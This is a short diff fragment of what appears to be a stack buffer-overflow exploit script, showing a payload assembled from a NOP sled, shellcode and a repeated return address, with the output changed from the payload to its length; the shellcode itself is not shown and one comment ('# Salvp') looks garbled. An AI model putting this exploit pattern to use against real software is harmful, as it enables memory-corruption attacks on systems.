@@ -9,4 +9,4 @@ ret_addr = "\xe0\xfd\xff\xbf"*10
 payload = nop_sled + shellcode + ret_addr
 
 # Salvp
-print(payload)
+print(len(payload))
